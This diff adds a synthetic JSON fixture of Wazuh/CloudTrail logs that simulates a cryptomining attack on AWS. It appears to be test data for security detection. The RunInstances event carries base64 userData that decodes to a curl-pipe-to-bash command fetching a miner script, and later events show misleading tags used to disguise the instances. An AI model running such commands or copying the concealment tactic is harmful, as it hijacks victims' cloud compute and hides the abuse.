@@ -1,0 +1,409 @@
+{
+  "_metadata": {
+    "attack_id": "T1496.001",
+    "variation": "001",
+    "name": "EC2 Cryptomining via GPU Instances",
+    "description": "Attacker launches expensive GPU instances (p4d.24xlarge) for cryptocurrency mining, then attempts to hide them with misleading tags",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "impact",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "CloudTrail: RunInstances - Launch 5x p4d.24xlarge GPU instances for cryptomining",
+      "sequence": 1,
+      "timestamp": "2026-02-23T14:16:00.000Z",
+      "log": {
+        "timestamp": "2026-02-23T14:16:01.000+0000",
+        "rule": {
+          "level": 6,
+          "description": "AWS Cloudtrail: ec2.amazonaws.com - RunInstances.",
+          "id": "100802",
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "amazon",
+            "aws",
+            "aws_cloudtrail"
+          ],
+          "pci_dss": [
+            "10.6.1"
+          ],
+          "hipaa": [
+            "164.312.b"
+          ],
+          "nist_800_53": [
+            "AU.6"
+          ],
+          "tsc": [
+            "CC7.2",
+            "CC7.3"
+          ],
+          "mitre": {
+            "id": [
+              "T1496.001"
+            ],
+            "tactic": [
+              "Impact"
+            ],
+            "technique": [
+              "Compute Hijacking"
+            ]
+          },
+          "gdpr": [
+            "IV_35.7.d"
+          ]
+        },
+        "agent": {
+          "id": "000",
+          "name": "wazuh.manager"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000029.290027",
+        "decoder": {
+          "name": "json"
+        },
+        "location": "Wazuh-AWS",
+        "data": {
+          "integration": "aws",
+          "aws": {
+            "eventVersion": "1.11",
+            "eventTime": "2026-02-23T14:16:00Z",
+            "eventSource": "ec2.amazonaws.com",
+            "eventName": "RunInstances",
+            "awsRegion": "us-east-2",
+            "sourceIPAddress": "198.51.100.77",
+            "userAgent": "aws-cli/2.15.0 Python/3.11.6 Linux/6.1.0-kali amd64",
+            "userIdentity": {
+              "type": "IAMUser",
+              "arn": "arn:aws:iam::575084400239:user/compromised-dev",
+              "accountId": "575084400239",
+              "userName": "compromised-dev",
+              "principalId": "AIDACKCEVSQ6C2EXAMPLE",
+              "accessKeyId": "AKIAIOSFODNN7EXAMPLE"
+            },
+            "requestParameters": {
+              "instanceType": "p4d.24xlarge",
+              "minCount": 5,
+              "maxCount": 5,
+              "imageId": "ami-0abcdef1234567890",
+              "subnetId": "subnet-0a1b2c3d4e5f6a7b8",
+              "instancesSet": {
+                "items": [
+                  {
+                    "instanceType": "p4d.24xlarge",
+                    "imageId": "ami-0abcdef1234567890"
+                  }
+                ]
+              },
+              "userData": "IyEvYmluL2Jhc2gKY3VybCAtcyBodHRwOi8vcG9vbC5taW5leG1yLmNvbS9taW5lci5zaCB8IGJhc2g="
+            },
+            "responseElements": {
+              "instancesSet": {
+                "items": [
+                  {
+                    "instanceId": "i-0a1b2c3d4e5f6a7b8",
+                    "instanceType": "p4d.24xlarge",
+                    "currentState": {
+                      "name": "pending"
+                    },
+                    "privateIpAddress": "198.51.100.100"
+                  },
+                  {
+                    "instanceId": "i-0b2c3d4e5f6a7b8c9",
+                    "instanceType": "p4d.24xlarge",
+                    "currentState": {
+                      "name": "pending"
+                    },
+                    "privateIpAddress": "198.51.100.101"
+                  },
+                  {
+                    "instanceId": "i-0c3d4e5f6a7b8c9d0",
+                    "instanceType": "p4d.24xlarge",
+                    "currentState": {
+                      "name": "pending"
+                    },
+                    "privateIpAddress": "198.51.100.102"
+                  },
+                  {
+                    "instanceId": "i-0d4e5f6a7b8c9d0e1",
+                    "instanceType": "p4d.24xlarge",
+                    "currentState": {
+                      "name": "pending"
+                    },
+                    "privateIpAddress": "198.51.100.103"
+                  },
+                  {
+                    "instanceId": "i-0e5f6a7b8c9d0e1f2",
+                    "instanceType": "p4d.24xlarge",
+                    "currentState": {
+                      "name": "pending"
+                    },
+                    "privateIpAddress": "198.51.100.104"
+                  }
+                ]
+              },
+              "reservationId": "r-0f6a7b8c9d0e1f2a3",
+              "ownerId": "575084400239"
+            },
+            "eventID": "c9e3f7a8-b0d2-4f4a-c7e9-3f2e8d6b0d47",
+            "requestID": "f0a1b2c3-d4e5-4f6a-c7b8-e9f0a1b2c3d4",
+            "readOnly": "false",
+            "eventType": "AwsApiCall",
+            "managementEvent": "true",
+            "recipientAccountId": "575084400239",
+            "eventCategory": "Management",
+            "source": "cloudtrail",
+            "aws_account_id": "575084400239"
+          }
+        }
+      }
+    },
+    {
+      "_comment": "CloudTrail: DescribeInstances - Verify mining instances are running",
+      "sequence": 2,
+      "timestamp": "2026-02-23T14:16:14.000Z",
+      "log": {
+        "timestamp": "2026-02-23T14:16:15.000+0000",
+        "rule": {
+          "level": 3,
+          "description": "AWS Cloudtrail: ec2.amazonaws.com - DescribeInstances.",
+          "id": "100802",
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "amazon",
+            "aws",
+            "aws_cloudtrail"
+          ],
+          "pci_dss": [
+            "10.6.1"
+          ],
+          "hipaa": [
+            "164.312.b"
+          ],
+          "nist_800_53": [
+            "AU.6"
+          ],
+          "tsc": [
+            "CC7.2",
+            "CC7.3"
+          ],
+          "mitre": {
+            "id": [
+              "T1496.001"
+            ],
+            "tactic": [
+              "Impact"
+            ],
+            "technique": [
+              "Compute Hijacking"
+            ]
+          },
+          "gdpr": [
+            "IV_35.7.d"
+          ]
+        },
+        "agent": {
+          "id": "000",
+          "name": "wazuh.manager"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000029.290028",
+        "decoder": {
+          "name": "json"
+        },
+        "location": "Wazuh-AWS",
+        "data": {
+          "integration": "aws",
+          "aws": {
+            "eventVersion": "1.11",
+            "eventTime": "2026-02-23T14:16:14Z",
+            "eventSource": "ec2.amazonaws.com",
+            "eventName": "DescribeInstances",
+            "awsRegion": "us-east-2",
+            "sourceIPAddress": "198.51.100.77",
+            "userAgent": "aws-cli/2.15.0 Python/3.11.6 Linux/6.1.0-kali amd64",
+            "userIdentity": {
+              "type": "IAMUser",
+              "arn": "arn:aws:iam::575084400239:user/compromised-dev",
+              "accountId": "575084400239",
+              "userName": "compromised-dev",
+              "principalId": "AIDACKCEVSQ6C2EXAMPLE",
+              "accessKeyId": "AKIAIOSFODNN7EXAMPLE"
+            },
+            "requestParameters": {
+              "instancesSet": {
+                "items": [
+                  {
+                    "instanceId": "i-0a1b2c3d4e5f6a7b8"
+                  },
+                  {
+                    "instanceId": "i-0b2c3d4e5f6a7b8c9"
+                  },
+                  {
+                    "instanceId": "i-0c3d4e5f6a7b8c9d0"
+                  },
+                  {
+                    "instanceId": "i-0d4e5f6a7b8c9d0e1"
+                  },
+                  {
+                    "instanceId": "i-0e5f6a7b8c9d0e1f2"
+                  }
+                ]
+              },
+              "filterSet": {}
+            },
+            "responseElements": null,
+            "eventID": "d0f4a8b9-c1e3-4a5b-d8f0-4a3f9e7c1e58",
+            "requestID": "a1b2c3d4-e5f6-4a7b-d8c9-f0a1b2c3d4e5",
+            "readOnly": "true",
+            "eventType": "AwsApiCall",
+            "managementEvent": "true",
+            "recipientAccountId": "575084400239",
+            "eventCategory": "Management",
+            "source": "cloudtrail",
+            "aws_account_id": "575084400239"
+          }
+        }
+      }
+    },
+    {
+      "_comment": "CloudTrail: CreateTags - Tag instances with misleading names to avoid suspicion",
+      "sequence": 3,
+      "timestamp": "2026-02-23T14:16:27.000Z",
+      "log": {
+        "timestamp": "2026-02-23T14:16:28.000+0000",
+        "rule": {
+          "level": 3,
+          "description": "AWS Cloudtrail: ec2.amazonaws.com - CreateTags.",
+          "id": "100802",
+          "firedtimes": 3,
+          "mail": false,
+          "groups": [
+            "amazon",
+            "aws",
+            "aws_cloudtrail"
+          ],
+          "pci_dss": [
+            "10.6.1"
+          ],
+          "hipaa": [
+            "164.312.b"
+          ],
+          "nist_800_53": [
+            "AU.6"
+          ],
+          "tsc": [
+            "CC7.2",
+            "CC7.3"
+          ],
+          "mitre": {
+            "id": [
+              "T1496.001"
+            ],
+            "tactic": [
+              "Impact"
+            ],
+            "technique": [
+              "Compute Hijacking"
+            ]
+          },
+          "gdpr": [
+            "IV_35.7.d"
+          ]
+        },
+        "agent": {
+          "id": "000",
+          "name": "wazuh.manager"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000029.290029",
+        "decoder": {
+          "name": "json"
+        },
+        "location": "Wazuh-AWS",
+        "data": {
+          "integration": "aws",
+          "aws": {
+            "eventVersion": "1.11",
+            "eventTime": "2026-02-23T14:16:27Z",
+            "eventSource": "ec2.amazonaws.com",
+            "eventName": "CreateTags",
+            "awsRegion": "us-east-2",
+            "sourceIPAddress": "198.51.100.77",
+            "userAgent": "aws-cli/2.15.0 Python/3.11.6 Linux/6.1.0-kali amd64",
+            "userIdentity": {
+              "type": "IAMUser",
+              "arn": "arn:aws:iam::575084400239:user/compromised-dev",
+              "accountId": "575084400239",
+              "userName": "compromised-dev",
+              "principalId": "AIDACKCEVSQ6C2EXAMPLE",
+              "accessKeyId": "AKIAIOSFODNN7EXAMPLE"
+            },
+            "requestParameters": {
+              "resourcesSet": {
+                "items": [
+                  {
+                    "resourceId": "i-0a1b2c3d4e5f6a7b8"
+                  },
+                  {
+                    "resourceId": "i-0b2c3d4e5f6a7b8c9"
+                  },
+                  {
+                    "resourceId": "i-0c3d4e5f6a7b8c9d0"
+                  },
+                  {
+                    "resourceId": "i-0d4e5f6a7b8c9d0e1"
+                  },
+                  {
+                    "resourceId": "i-0e5f6a7b8c9d0e1f2"
+                  }
+                ]
+              },
+              "tagSet": {
+                "items": [
+                  {
+                    "key": "Name",
+                    "value": "ml-training-batch-worker"
+                  },
+                  {
+                    "key": "Environment",
+                    "value": "staging"
+                  },
+                  {
+                    "key": "Team",
+                    "value": "data-science"
+                  },
+                  {
+                    "key": "CostCenter",
+                    "value": "ML-Research-2026"
+                  }
+                ]
+              }
+            },
+            "responseElements": {
+              "_return": true
+            },
+            "eventID": "e1a5b9c0-d2f4-4b6c-e9a1-5b4a0f8d2f69",
+            "requestID": "b2c3d4e5-f6a7-4b8c-e9d0-a1b2c3d4e5f6",
+            "readOnly": "false",
+            "eventType": "AwsApiCall",
+            "managementEvent": "true",
+            "recipientAccountId": "575084400239",
+            "eventCategory": "Management",
+            "source": "cloudtrail",
+            "aws_account_id": "575084400239"
+          }
+        }
+      }
+    }
+  ]
+}
